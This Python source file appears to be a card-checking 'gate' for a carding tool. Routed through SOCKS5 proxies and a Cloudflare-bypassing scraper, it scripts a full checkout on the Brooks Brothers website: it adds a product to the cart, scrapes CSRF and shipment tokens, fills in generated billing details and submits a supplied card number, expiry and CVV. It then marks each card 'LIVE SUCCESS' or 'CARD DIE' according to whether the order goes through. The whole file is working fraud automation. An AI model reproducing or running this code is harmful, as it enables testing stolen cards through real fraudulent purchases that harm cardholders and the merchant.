
   
import json
import cloudscraper
from time import sleep
from urllib.parse import quote
from random import randint
from dependencie.infobill import infobill

from model.models import gateData
from requests_toolbelt.multipart.encoder import MultipartEncoder

class CoreGateCode:
    def __init__(self, cardID):
        self.cardID = cardID
        self.cardIDx2 = ""
        self.billx = infobill()
    def getStr(self,data,inicio,final):
        strx1 = data.split(inicio)
        strx2 = strx1[1].split(final)
        return strx2[0]
    def __valiDCardId(self):
        if self.cardID == 'visa':
            self.cardIDx2 = 'Visa'
        elif self.cardID == 'mc':
            self.cardIDx2 = 'Master+Card'
        elif self.cardID == 'amex':
            self.cardIDx2 = 'Amex'
        elif self.cardID == 'discovery':
            self.cardIDx2 = 'Discover'

    def processCodeGate(self,cc,dataGate:gateData):
        self.__valiDCardId()
        cc1 = cc.ccnum[0:6]
        cc2 = cc.ccnum[12:16]



        proxies = {
            'http': f'socks5://{dataGate.proxy}',
            'https': f'socks5://{dataGate.proxy}'
        }
        timeout = 40

        cs = cloudscraper.create_scraper(
            browser={
                'browser': 'firefox',
                'platform': 'windows',
                'mobile': False

            },
            debug=False

        )


    #datext

        #cs.proxies.update(proxies)
        try:
            status = dict()


            #x xxxx



            url="https://www.brooksbrothers.com/brooks-brothers-27%22-round-waxed-colored-laces-by-benjo%27s/MH00336.html?dwvar_MH00336_Color=BLUE"
            headers={
            "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0",
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language":"en-US,en;q=0.5",
            "Accept-Encoding":"gzip, deflate, br",
            "DNT":"1",
            "Connection":"keep-alive",
            "Upgrade-Insecure-Requests":"1",
            "Sec-Fetch-Dest":"document",
            "Sec-Fetch-Mode":"navigate",
            "Sec-Fetch-Site":"none",
            'Sec-Fetch-User':'?1'
            }
            datac=cs.get(url=url,headers=headers,proxies=proxies,timeout=timeout)


            url="https://www.brooksbrothers.com/on/demandware.store/Sites-brooksbrothers-Site/en_US/Cart-AddProduct"
            headers={
            "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0",
            "Accept":"*/*",
            "Accept-Language":"en-US,en;q=0.5",
            "Accept-Encoding":"gzip, deflate, br",
            "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With":"XMLHttpRequest",
            "Origin":"https://www.brooksbrothers.com",
            "DNT":"1",
            "Connection":"keep-alive",
            "Referer":"https://www.brooksbrothers.com/brooks-brothers-27%22-round-waxed-colored-laces-by-benjo%27s/MH00336.html?dwvar_MH00336_Color=BLUE",
            "Sec-Fetch-Dest":"empty",
            "Sec-Fetch-Mode":"cors",
            'Sec-Fetch-Site':'same-origin'
            }
            data='pid=MH00336_____BLUE_ONE__SIZE&uuid=&quantity=1&options=%5B%7B%22storeId%22%3Anull%7D%5D&allowAddToCart=true&selectedOptionValueId=&storeId='
            datac=cs.post(url=url,headers=headers,data=data,proxies=proxies,timeout=timeout)



            url="https://www.brooksbrothers.com/on/demandware.store/Sites-brooksbrothers-Site/en_US/Checkout-Login"
            headers={
            "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0",
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language":"en-US,en;q=0.5",
            "Accept-Encoding":"gzip, deflate, br",
            "DNT":"1",
            "Connection":"keep-alive",
            "Referer":"https://www.brooksbrothers.com/brooks-brothers-27%22-round-waxed-colored-laces-by-benjo%27s/MH00336.html?dwvar_MH00336_Color=BLUE",
            "Upgrade-Insecure-Requests":"1",
            "Sec-Fetch-Dest":"document",
            "Sec-Fetch-Mode":"navigate",
            "Sec-Fetch-Site":"same-origin",
            'Sec-Fetch-User':'?1'
            }
            datac=cs.get(url=url,headers=headers,proxies=proxies,timeout=timeout)



            url="https://www.brooksbrothers.com/on/demandware.store/Sites-brooksbrothers-Site/en_US/Checkout-Begin"
            headers={
            "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0",
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language":"en-US,en;q=0.5",
            "Accept-Encoding":"gzip, deflate, br",
            "DNT":"1",
            "Connection":"keep-alive",
            "Referer":"https://www.brooksbrothers.com/on/demandware.store/Sites-brooksbrothers-Site/en_US/Checkout-Login",
            "Upgrade-Insecure-Requests":"1",
            "Sec-Fetch-Dest":"document",
            "Sec-Fetch-Mode":"navigate",
            "Sec-Fetch-Site":"same-origin",
            'Sec-Fetch-User':'?1'
            }
            datac=cs.get(url=url,headers=headers,proxies=proxies,timeout=timeout)







            Shipidsu = self.getStr(datac.text,'name="shipmentUUID" type="hidden" value="','"')
            ctrToken =  self.getStr(datac.text,'name="csrf_token" value="','"')




            url="https://www.brooksbrothers.com/on/demandware.store/Sites-brooksbrothers-Site/en_US/CheckoutShippingServices-UpdateShippingMethodsList"
            headers={
            "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0",
            "Accept":"application/json, text/javascript, */*; q=0.01",
            "Accept-Language":"en-US,en;q=0.5",
            "Accept-Encoding":"gzip, deflate, br",
            "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With":"XMLHttpRequest",
            "Origin":"https://www.brooksbrothers.com",
            "DNT":"1",
            "Connection":"keep-alive",
            "Referer":"https://www.brooksbrothers.com/on/demandware.store/Sites-brooksbrothers-Site/en_US/Checkout-Begin?stage=shipping",
            "Sec-Fetch-Dest":"empty",
            "Sec-Fetch-Mode":"cors",
            "Sec-Fetch-Site":"same-origin",
            'TE':'trailers'
            }
            data='firstName='+self.billx.nameFirs+'&lastName='+self.billx.nameLast+'&address1='+self.billx.address+'&address2=&city='+self.billx.city+'&postalCode='+self.billx.zipcode+'&stateCode='+self.billx.estado2+'&countryCode=US&isGift=false&giftMessage=&hasGiftMessage=false&usingVerifiedAddress=true&shipmentUUID='+Shipidsu
            datac=cs.post(url=url,headers=headers,data=data,proxies=proxies,timeout=timeout)





            url="https://www.brooksbrothers.com/on/demandware.store/Sites-brooksbrothers-Site/en_US/CheckoutShippingServices-SubmitShipping"
            headers={
            "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0",
            "Accept":"*/*",
            "Accept-Language":"en-US,en;q=0.5",
            "Accept-Encoding":"gzip, deflate, br",
            "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With":"XMLHttpRequest",
            "Origin":"https://www.brooksbrothers.com",
            "DNT":"1",
            "Connection":"keep-alive",
            "Referer":"https://www.brooksbrothers.com/on/demandware.store/Sites-brooksbrothers-Site/en_US/Checkout-Begin?stage=shipping",
            "Sec-Fetch-Dest":"empty",
            "Sec-Fetch-Mode":"cors",
            'Sec-Fetch-Site':'same-origin'
            }
            data='originalShipmentUUID='+Shipidsu+'&shipmentUUID='+Shipidsu+'&dwfrm_shipping_shippingAddress_addressFields_usingVerifiedAddress=true&dwfrm_shipping_shippingAddress_addressFields_firstName='+self.billx.nameFirs+'&dwfrm_shipping_shippingAddress_addressFields_lastName='+self.billx.nameLast+'&dwfrm_shipping_shippingAddress_addressFields_address1='+self.billx.address+'&dwfrm_shipping_shippingAddress_addressFields_address2=&dwfrm_shipping_shippingAddress_addressFields_city='+self.billx.city+'&dwfrm_shipping_shippingAddress_addressFields_states_stateCode='+self.billx.estado2+'&dwfrm_shipping_shippingAddress_addressFields_postalCode='+self.billx.zipcode+'&dwfrm_shipping_shippingAddress_addressFields_country=US&shipmentUUID='+Shipidsu+'&dwfrm_shipping_shippingAddress_shippingMethodID=1&dwfrm_shipping_shippingAddress_giftMessage=&csrf_token='+ctrToken
            datac=cs.post(url=url,headers=headers,data=data,proxies=proxies,timeout=timeout)



            sleep(randint(0,4))

            url="https://www.brooksbrothers.com/on/demandware.store/Sites-brooksbrothers-Site/en_US/CheckoutServices-SubmitPayment"
            headers={
            "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0",
            "Accept":"*/*",
            "Accept-Language":"en-US,en;q=0.5",
            "Accept-Encoding":"gzip, deflate, br",
            "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With":"XMLHttpRequest",
            "Origin":"https://www.brooksbrothers.com",
            "DNT":"1",
            "Connection":"keep-alive",
            "Referer":"https://www.brooksbrothers.com/on/demandware.store/Sites-brooksbrothers-Site/en_US/Checkout-Begin?stage=payment",
            "Sec-Fetch-Dest":"empty",
            "Sec-Fetch-Mode":"cors",
            "Sec-Fetch-Site":"same-origin",
            'TE':'trailers'
            }
            data='addressSelector='+Shipidsu+'&dwfrm_billing_addressFields_firstName='+self.billx.nameFirs+'&dwfrm_billing_addressFields_lastName='+self.billx.nameLast+'&dwfrm_billing_addressFields_address1='+self.billx.address+'&dwfrm_billing_addressFields_address2=&dwfrm_billing_addressFields_country=US&dwfrm_billing_addressFields_states_stateCode='+self.billx.estado2+'&dwfrm_billing_addressFields_city='+self.billx.city+'&dwfrm_billing_addressFields_postalCode='+self.billx.zipcode+'&dwfrm_billing_addressFields_taxnumber=&dwfrm_billing_contactInfoFields_email='+self.billx.emailx+'%40hotmail.com&dwfrm_billing_contactInfoFields_phone='+self.billx.phone1+'&csrf_token='+ctrToken+'&couponCode=&giftCardNumber=&giftCardPinNumber=&dwfrm_billing_paymentMethod=CREDIT_CARD&dwfrm_billing_paypal_paypalOrderID=&dwfrm_billing_paypal_savePaypalAccount=&dwfrm_billing_paypal_makeDefaultPaypalAccount=&dwfrm_billing_paypal_paypalActiveAccount=&usedPaymentMethod=&restPaypalAccountsList=newaccount&dwfrm_billing_paypal_billingAgreementID=&dwfrm_billing_paypal_billingAgreementPayerEmail=&dwfrm_klarna_paymentCategory=pay_over_time&dwfrm_billing_creditCardFields_cardType='+self.cardIDx2+'&dwfrm_billing_creditCardFields_cardNumber='+cc.ccnum+'&dwfrm_billing_creditCardFields_expirationMonth='+cc.expm+'&dwfrm_billing_creditCardFields_expirationYear='+cc.expy+'&dwfrm_billing_creditCardFields_securityCode='+cc.cv2
            datac=cs.post(url=url,headers=headers,data=data,proxies=proxies,timeout=timeout)



            url="https://www.brooksbrothers.com/on/demandware.store/Sites-brooksbrothers-Site/en_US/CheckoutServices-PlaceOrder"
            headers={
            "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0",
            "Accept":"*/*",
            "Accept-Language":"en-US,en;q=0.5",
            "Accept-Encoding":"gzip, deflate, br",
            "X-Requested-With":"XMLHttpRequest",
            "Origin":"https://www.brooksbrothers.com",
            "DNT":"1",
            "Connection":"keep-alive",
            "Referer":"https://www.brooksbrothers.com/on/demandware.store/Sites-brooksbrothers-Site/en_US/Checkout-Begin?stage=placeOrder",
            "Sec-Fetch-Dest":"empty",
            "Sec-Fetch-Mode":"cors",
            "Sec-Fetch-Site":"same-origin",
            "Content-Length":"0",
            'TE':'trailers'
            }
            data =""
            datac=cs.post(url=url,headers=headers,data=data,proxies=proxies,timeout=timeout)



            if "Please try again or enter a different card. If the problem persists, please contact customer service." in datac.text:
                status = {'msg':1,'contentCC': dataGate.cc,'ccResponse': dataGate.cc+"[CARD DIE]",'proxy':dataGate.proxy,'datext':None}

            # elif "CVV2 Mismatch: 15004-This transaction cannot be processed." in datac.text:
            #     status = {'msg':1,'contentCC': dataGate.cc,'ccResponse': dataGate.cc+"[CARD DIE]",'proxy':dataGate.proxy,'datext':None}
            # elif "Your credit card payment has been declined due to incorrect card details or insufficient funds on the card." in datac.text:
            #     status = {'msg':1,'contentCC': dataGate.cc,'ccResponse': dataGate.cc+"[CARD DIE]",'proxy':dataGate.proxy,'datext':None}
            elif "Sites-brooksbrothers-Site/en_US/Order-Confirm" in datac.text:
                status = {'msg':2,'contentCC': dataGate.cc,'ccResponse': dataGate.cc+" [LIVE SUCCESS]",'proxy':dataGate.proxy,'datext':None}
            else:
                status = {'msg':3,'contentCC':dataGate.cc,'ccResponse': " CC =====>"+dataGate.cc ,'proxy':dataGate.proxy,'datext':None}
                
            return status
        except Exception as e:
            print(e,'que paso')
            return {'msg':4,'contentCC':dataGate.cc,'ccResponse': dataGate.cc,'proxy':dataGate.proxy}

